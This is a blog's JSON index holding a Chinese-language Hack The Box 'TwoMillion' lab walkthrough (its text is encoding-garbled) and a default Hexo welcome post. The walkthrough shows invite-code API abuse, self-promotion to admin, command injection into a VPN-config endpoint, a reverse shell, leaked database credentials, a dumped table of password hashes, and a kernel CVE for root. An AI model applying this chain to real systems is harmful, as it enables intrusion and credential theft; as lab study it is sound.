{"meta":{"title":"Someb0dy's blog","subtitle":"","description":"Always Be Hungry,Be Foolish","author":"Someb0dy","url":"someb0dy.github.io","root":"/"},"pages":[{"title":"categories","date":"2023-06-14T02:34:18.000Z","updated":"2023-06-14T02:34:18.776Z","comments":true,"path":"categories/index.html","permalink":"someb0dy.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2023-06-14T02:34:02.537Z","updated":"2023-06-14T02:34:02.536Z","comments":false,"path":"tags/index.html","permalink":"someb0dy.github.io/tags/index.html","excerpt":"","text":"title: tagsdate: 2023-06-14 10:32:56"}],"posts":[{"title":"TwoMillion","slug":"TwoMillion","date":"2023-06-14T04:22:31.259Z","updated":"2023-06-13T05:11:12.849Z","comments":true,"path":"2023/06/14/TwoMillion/","link":"","permalink":"someb0dy.github.io/2023/06/14/TwoMillion/","excerpt":"","text":"12023å¹´6æœˆ13æ—¥ 10:05:44 Nmap1234567891011121314151617â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# nmap -sCV 10.10.11.221Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 22:03 EDTNmap scan report for 10.10.11.221Host is up (0.15s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)|_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)80/tcp open http nginx|_http-title: Did not follow redirect to http://2million.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds ç»å…¸ä¸¤ä¸ªç«¯å£22,80 image.png ä¿®æ”¹&#x2F;etc&#x2F;hostsæ–‡ä»¶ image.png image.png æœ‰ç™»å½•ï¼ŒçŒœæµ‹æœ‰æ³¨å†Œ è®¿é—®&#x2F;regiser image.png æ³¨å†Œå‘ç°ä¹Ÿå¤±è´¥äº†ï¼Œéœ€è¦é‚€è¯·ç ï¼Œèµ°æŠ•æ— è·¯çš„æ„Ÿè§‰- - ï¼Œç¿»ç¿»bpå†å²ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç”Ÿæˆcodeç›¸å…³é€»è¾‘çš„. inviteapi.min.js image.png è®¾ç½®è¿‡æ»¤å™¨ image.png è¿™ä¸ªjsæ–‡ä»¶çœ‹èµ·æ¥åƒå’Œé‚€è¯·ç æœ‰å…³ç³»çš„é€»è¾‘ image.png è¿™æ®µä»£ç å…¶å®æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªåå«makeInviteCode çš„å‡½æ•°,æˆ‘ä»¬åœ¨consoleè°ƒç”¨ä¸€ä¸‹ image.png 12345678910111213141516171819202122232425262728293031function verifyInviteCode(code) &#123; var formData = &#123; \"code\": code &#125;; $.ajax(&#123; type: \"POST\", dataType: \"json\", data: formData, url: '/api/v1/invite/verify', success: function(response) &#123; console.log(response) &#125;, error: function(response) &#123; console.log(response) &#125; &#125;)&#125;function makeInviteCode() &#123; $.ajax(&#123; type: \"POST\", dataType: \"json\", url: '/api/v1/invite/how/to/generate', success: function(response) &#123; console.log(response) &#125;, error: function(response) &#123; console.log(response) &#125; &#125;)&#125; æœ‰ä¸€ä¸ªè·¯ç”± 12345678910111213POST /api/v1/invite/how/to/generate HTTP/1.1Host: 2million.htbContent-Length: 0Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36Content-Type: application/jsonOrigin: http://2million.htbReferer: http://2million.htb/inviteAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=stdisqd79m2j4qb1f3s9a6f250Connection: close 1234567891011HTTP/1.1 200 OKServer: nginxDate: Tue, 13 Jun 2023 03:28:53 GMTContent-Type: application/jsonConnection: closeExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheContent-Length: 249&#123;\"0\":200,\"success\":1,\"data\":&#123;\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\"enctype\":\"ROT13\"&#125;,\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"&#125; image.png ROT13è§£å¯† image.png ä»–è®©æˆ‘ä»¬è¯·æ±‚&#x2F;api&#x2F;v1&#x2F;invite&#x2F;generateè¿™ä¸ªè·¯ç”± image.png base64è§£å¯†ä¸€ä¸‹æ¥ç€å°±è¿›è¡Œæ³¨å†Œä»¥åŠç™»å½•çš„æ“ä½œ ç™»å½•åå°ç™»å½•ä¹‹åæˆ‘ä»¬è¿›å…¥åˆ°äº†ä¸€ä¸ªç±»ä¼¼HTBçš„ç•Œé¢ image.png è¿™é‡Œå¯ä»¥ä¸‹è½½ovpné…ç½®æ–‡ä»¶ä½†æ˜¯è¿æ¥ä¸ä¸Šå» image.png è¿æ¥å‰æŠŠè¿™ä¸ªè§£æçš„åŸŸåè®°å¾—åŠ å…¥åˆ° &#x2F;etc&#x2F;hostsæ–‡ä»¶ image.png &#x2F;api&#x2F;v1æˆ‘ä»¬è·å–è·¯ç”±åˆ—è¡¨ç™»å½•è¿‡åæœ‰æˆæƒäº† image.png å…¶ä¸­æœ‰ä¸€ä¸ªè·¯ç”±settings&#x2F;update æ›´æ–°è®¾ç½® image.png æˆ‘ä»¬ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œå›æ˜¾å‘ç°Invalid content type , å¤±æ•ˆçš„å†…å®¹ç±»å‹æ¢æˆjsonè¯•è¯• image.png image.png æ ¹æ®å›æ˜¾æ“ä½œï¼Œæˆ‘ä»¬å·²ç»æŠŠè‡ªå·±ä¿®æ”¹æˆä¸ºäº†ç®¡ç†å‘˜æƒé™ image.png éªŒè¯ç®¡ç†å‘˜æƒé™æˆåŠŸ image.png é€šè¿‡è¿™ä¸ªè·¯ç”±ç”Ÿæˆäº†ä¸€ä¸ªå¸¦vpnæƒé™çš„ovpné…ç½®æ–‡ä»¶ï¼Œå‰é¢è‡ªå·±ä½¿ç”¨æ™®é€šç”¨æˆ·çš„ovpné…ç½®æ–‡ä»¶å¤±è´¥ ç»“æœè¿™ä¸ªåœ°æ–¹ç”Ÿæˆçš„é…ç½®æ–‡ä»¶è¿˜æ˜¯ç”¨ä¸äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢- - RCEæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹è¿™ä¸ªåœ°æ–¹ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œæ˜¯å¦‚ä½•ç”Ÿæˆçš„å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼ image.png ä»–è¯»å–æˆ‘ä»¬çš„å‚æ•°ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰ä½“ç°ï¼Œæ‰€ä»¥ä¼šä¸ä¼šæ˜¯åˆ©ç”¨ç±»ä¼¼ä¸‹é¢ä»£ç çš„æ¥å®ç°çš„å‘¢ä¸‹é¢çš„ä»£ç åªæ˜¯ä¾‹å­ï¼Œå…·ä½“å®ç°ä¸ä¸€å®šæ˜¯è¿™æ · 123&lt;?php$username = $_POST[\"username\"];system(\"openvpn\"+$username); æ‰€ä»¥è¿™é‡Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ image.png è¿™æ ·å¥½åƒå¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ é‚£å½“æˆ‘ä»¬å†åŠ ä¸€ä¸ªæ³¨é‡Šç¬¦å·**# å‘¢ï¼Ÿ**åœ¨linuxç³»ç»Ÿä¸­ # è¿™ä¸ªç¬¦å·åé¢çš„å†…å®¹ä¼šå½“ä½œæ³¨é‡Šæ¥è§£é‡Š image.png èŠœæ¹–ï¼ï¼ï¼ 123&lt;?php$username = $_POST[\"username\"];system(\"openvpn\"+$username+\"Paramter\"); æ‰€ä»¥ä»–é€»è¾‘ä¼°è®¡æ˜¯è¿™æ ·çš„ç»“æ„ ï¼Œåé¢å­˜åœ¨åˆ«çš„å‚æ•° # æŠŠåé¢çš„å‚æ•°æ³¨é‡Šåå°±æˆåŠŸäº†åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨idåé¢å†åŠ ä¸Šä¸€ä¸ª; ä¹Ÿå¯ä»¥æ‰§è¡Œä»£ç æˆåŠŸ image.png åå¼¹shell image.png æ•°æ®åº“é…ç½®æ–‡ä»¶ image.png username password admin SuperDuperPass123 12345678910111213141516171819202122232425262728www-data@2million:~/html$ which python3which python3/usr/bin/python3www-data@2million:~/html$ python3 -c \"import pty;pty.spawn('/bin/bash')\"python3 -c \"import pty;pty.spawn('/bin/bash')\"www-data@2million:~/html$ mysql -u admin -pmysql -u admin -pEnter password: SuperDuperPass123Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 334231Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;show databases;+--------------------+| Database |+--------------------+| htb_prod || information_schema |+--------------------+2 rows in set (0.001 sec)MariaDB [(none)]&gt; é€šè¿‡python3è·å–ä¸€ä¸ªäº¤äº’å¼æ›´å¼ºçš„shellï¼Œè¿æ¥mysqlæ•°æ®åº“ 12345678910111213141516171819202122232425262728293031MariaDB [(none)]&gt; use htb_prod;use htb_prod;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [htb_prod]&gt; show tables;show tables;+--------------------+| Tables_in_htb_prod |+--------------------+| invite_codes || users |+--------------------+2 rows in set (0.000 sec)MariaDB [htb_prod]&gt; select * from users;select * from users;+----+--------------+----------------------------+--------------------------------------------------------------+----------+| id | username | email | password | is_admin |+----+--------------+----------------------------+--------------------------------------------------------------+----------+| 11 | TRX | trx@hackthebox.eu | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq | 1 || 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK | 1 || 13 | admin1 | admin@test.org | $2y$10$qVCYOU26KpbHwZdKYQo2YOkthu2Lik9N7vrqZ4/NQoSPjObR0N20S | 1 || 14 | shade1 | shade1@shade.com | $2y$10$rnJHveB0D9q6fJBtZLJ8/uy/uMI.qEicO6Lu5.k.I1talOCyPvywO | 1 || 15 | razorrob123 | shopovrobert@gmail.com | $2y$10$KGOX6WLIrGJi9tgozKDLTeoG3v0EDGew4e0FBIJoDpqlKPwRM//Pq | 0 || 16 | someb0dy | someb0dy@htb.com | $2y$10$SJPLEKKcBzP/G8dCxl0ADew14SzyKqSYw7/oloqYft8DTip//9BS6 | 1 |+----+--------------+----------------------------+--------------------------------------------------------------+----------+6 rows in set (0.000 sec)MariaDB [htb_prod]&gt; è¿™äº›æ•°æ®ä¼°è®¡æ˜¯å…¶ä»–ç©å®¶æ’å…¥çš„æ•°æ® æŸ¥çœ‹å¸¦shæƒé™çš„ç”¨æˆ· 1234567www-data@2million:~/html$ cat /etc/passwd | grep shcat /etc/passwd | grep shroot:x:0:0:root:/root:/bin/bashwww-data:x:33:33:www-data:/var/www:/bin/bashsshd:x:106:65534::/run/sshd:/usr/sbin/nologinfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinadmin:x:1000:1000::/home/admin:/bin/bash å‘ç°adminå°±æ˜¯å¸¦shçš„ï¼Œç›´æ¥ç”¨æ•°æ®åº“çš„é…ç½®æ–‡ä»¶sshç™»å½•å°è¯• image.png Root123456789101112131415admin@2million:/var/mail$ cat adminFrom: ch4p &lt;ch4p@2million.htb&gt;To: admin &lt;admin@2million.htb&gt;Cc: g0blin &lt;g0blin@2million.htb&gt;Subject: Urgent: Patch System OSDate: Tue, 1 June 2023 10:45:22 -0700Message-ID: &lt;9876543210@2million.htb&gt;X-Mailer: ThunderMail Pro 5.2Hey admin,I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.HTB Godfatheradmin@2million:/var/mail$ è¿™é‡Œæœ‰ä¸€å°é‚®ä»¶,è¯´æœ‰ä¸€ä¸ªCVE CVE-2023-3086Refer:https://github.com/xkaneiki/CVE-2023-0386 image.png image.png image.png è¿™é‡Œè¿˜æœ‰ä¸€å°ç±»ä¼¼æ„Ÿè°¢ä¿¡çš„ä¸œè¥¿ 1&#123;\"encryption\": \"xor\", \"encrpytion_key\": \"HackTheBox\", \"encoding\": \"base64\", \"data\": \"DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA==\" image.png æ„Ÿè°¢ä¿¡12345678910111213Dear HackTheBox Community,We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.With deepest gratitude,The HackTheBox Team","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-06-14T02:22:43.138Z","updated":"1985-10-26T08:15:00.000Z","comments":true,"path":"2023/06/14/hello-world/","link":"","permalink":"someb0dy.github.io/2023/06/14/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}